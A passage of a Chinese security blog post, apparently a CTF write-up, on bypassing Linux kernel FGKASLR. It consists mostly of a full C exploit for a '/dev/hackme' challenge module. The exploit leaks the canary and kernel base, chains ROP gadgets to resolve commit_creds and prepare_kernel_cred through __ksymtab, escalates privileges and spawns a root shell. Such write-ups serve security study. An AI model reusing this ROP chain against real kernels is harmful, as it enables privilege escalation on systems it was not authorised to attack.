+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307032150491.png" srcset="/img/loading.gif" lazyload alt="image-20230703214402506"></p>
+<p>因此针对<code>FGKASLR</code>保护的绕过，实际是利用<code>FGKASLR</code>特点，只在特定的区域中选取适合的<code>gadget</code>，从而将<code>FGKASLR</code>弱化为<code>KASLR</code>，进而继续利用。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret;  --  [0x6370]</span><br><span class="hljs-comment">0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [0x200f10]</span><br><span class="hljs-comment">0xffffffff81004d11: pop rax; ret; [0x4d11]</span><br><span class="hljs-comment">0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]</span><br><span class="hljs-comment">0xffffffff81f87d90 r __ksymtab_commit_creds [0xf87d90]</span><br><span class="hljs-comment">0xffffffff81f8d4fc r __ksymtab_prepare_kernel_cred [0xf8d4fc]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 1</span><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs = MAX,user_rflags = MAX,user_sp = MAX,user_ss = MAX;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> image_base;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> commit_creds;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prepare_kernel_cred;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary;<br><br><span class="hljs-type">int</span> prepare_kernel_cred_offset;<br><span class="hljs-type">int</span> commit_creds_offset;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cred;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_commit_creds</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_prepare_kernel_cred</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">get_cred</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_get_cred</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_leak_prepare_kernel_cred</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_get_cred</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_back_door</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span>;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span><br>&#123;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>		<span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>		<span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>		<span class="hljs-string">&quot;pushf;&quot;</span><br>		<span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save state***&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_cs:0x%lx\n&quot;</span>, user_cs);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_sp:0x%lx\n&quot;</span>, user_sp);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_ss:0x%lx\n&quot;</span>, user_ss);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_rflags:0x%lx\n&quot;</span>, user_rflags);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save finish***&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***getshell***&quot;</span>);<br>	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>		payload[index++] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>	payload[index++] = canary;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base +  <span class="hljs-number">0x4d11</span>; <span class="hljs-comment">//pop_rax_ret</span><br>	payload[index++] = image_base + <span class="hljs-number">0xf87d90</span>; <span class="hljs-comment">//__ksymtab_commit_creds</span><br>	payload[index++] = image_base + <span class="hljs-number">0x15a7f</span>; <span class="hljs-comment">// mov rax, qword ptr [rax]; pop rbp; ret;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base + <span class="hljs-number">0x200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)leak_commit_creds;<br>	payload[index++] = user_cs;<br>	payload[index++] = user_rflags;<br>	payload[index++] = user_sp;<br>	payload[index++] = user_ss;<br>	write(fd, payload, index * <span class="hljs-number">8</span>);<br>	<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_commit_creds</span><span class="hljs-params">()</span><br>&#123;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov commit_creds_offset, eax;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_cred_offset:0x%x\n&quot;</span>, commit_creds_offset);<br>	commit_creds = image_base + <span class="hljs-number">0xf87d90</span> + (<span class="hljs-type">int</span>)commit_creds_offset;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_cred:0x%lx\n&quot;</span>, commit_creds);<br>	jmp_leak_prepare_kernel_cred();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_leak_prepare_kernel_cred</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>		payload[index++] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>	payload[index++] = canary;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base +  <span class="hljs-number">0x4d11</span>; <span class="hljs-comment">//pop_rax_ret</span><br>	payload[index++] = image_base + <span class="hljs-number">0xf8d4fc</span>; <span class="hljs-comment">//__ksymtab_prepare_kernel_cred</span><br>	payload[index++] = image_base + <span class="hljs-number">0x15a7f</span>; <span class="hljs-comment">// mov rax, qword ptr [rax]; pop rbp; ret;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base + <span class="hljs-number">0x200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)leak_prepare_kernel_cred;<br>	payload[index++] = user_cs;<br>	payload[index++] = user_rflags;<br>	payload[index++] = user_sp;<br>	payload[index++] = user_ss;<br>	write(fd, payload, index * <span class="hljs-number">8</span>);	<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_prepare_kernel_cred</span><span class="hljs-params">()</span><br>&#123;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov prepare_kernel_cred_offset, rax;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred_offset:0x%x\n&quot;</span>, prepare_kernel_cred_offset);<br>	prepare_kernel_cred = image_base + <span class="hljs-number">0xf8d4fc</span> + (<span class="hljs-type">int</span>)prepare_kernel_cred_offset;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred:0x%lx\n&quot;</span>, prepare_kernel_cred);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;jmp get cred\n&quot;</span>);<br>	jmp_get_cred();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_get_cred</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>		payload[index++] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>	payload[index++] = canary;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base +  <span class="hljs-number">0x6370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = prepare_kernel_cred; <span class="hljs-comment">// prepare_kernel_cred</span><br>	payload[index++] = image_base + <span class="hljs-number">0x200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)get_cred;<br>	payload[index++] = user_cs;<br>	payload[index++] = user_rflags;<br>	payload[index++] = user_sp;<br>	payload[index++] = user_ss;<br>	write(fd, payload, index * <span class="hljs-number">8</span>);	<br>	<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_cred</span><span class="hljs-params">()</span><br>&#123;<br>	__asm(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov cred, rax;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred:0x%lx\n&quot;</span>, cred);<br>	jmp_back_door();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jmp_back_door</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>		payload[index++] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>	payload[index++] = canary;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = image_base +  <span class="hljs-number">0x6370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>	payload[index++] = cred; 		 <span class="hljs-comment">//cred</span><br>	payload[index++] = commit_creds; <span class="hljs-comment">// commit_creds</span><br>	payload[index++] = image_base + <span class="hljs-number">0x200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = <span class="hljs-number">0</span>;<br>	payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>	payload[index++] = user_cs;<br>	payload[index++] = user_rflags;<br>	payload[index++] = user_sp;<br>	payload[index++] = user_ss;<br>	write(fd, payload, index * <span class="hljs-number">8</span>);	<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	save_state();<br>	fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>	read(fd, buf, <span class="hljs-number">40</span> * <span class="hljs-number">8</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++)<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d\taddress:0x%lx\n&quot;</span>,i, buf[i]);<br>	canary = buf[<span class="hljs-number">2</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> leak_addr = buf[<span class="hljs-number">38</span>];<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak addr:0x%lx\n&quot;</span>, leak_addr);<br>	image_base = leak_addr - <span class="hljs-number">0xa157</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ImageBase:0x%lx\n&quot;</span>, image_base);<br>	start();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/#about-kaslr-and-fg-kaslr">https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/#about-kaslr-and-fg-kaslr</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#_1">https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#_1</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog-wohin-me.translate.goog/posts/linux-kernel-pwn-01/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl">https://blog-wohin-me.translate.goog/posts/linux-kernel-pwn-01/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/kernel/" class="category-chain-item">kernel</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel/">#kernel</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kernel-Pwn-FGKASLR</div>
+      <div>https://h0pe-ay.github.io/undefined/Kernel-Pwn-FGKASLR/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>hope</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/undefined/ret2dir/" title="ret2dir">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ret2dir</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/undefined/Sudo%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CVE-2021-3156)%E5%A4%8D%E7%8E%B0/" title="CVE-2021-3156-Sudo堆溢出漏洞">
+                        <span class="hidden-mobile">CVE-2021-3156-Sudo堆溢出漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
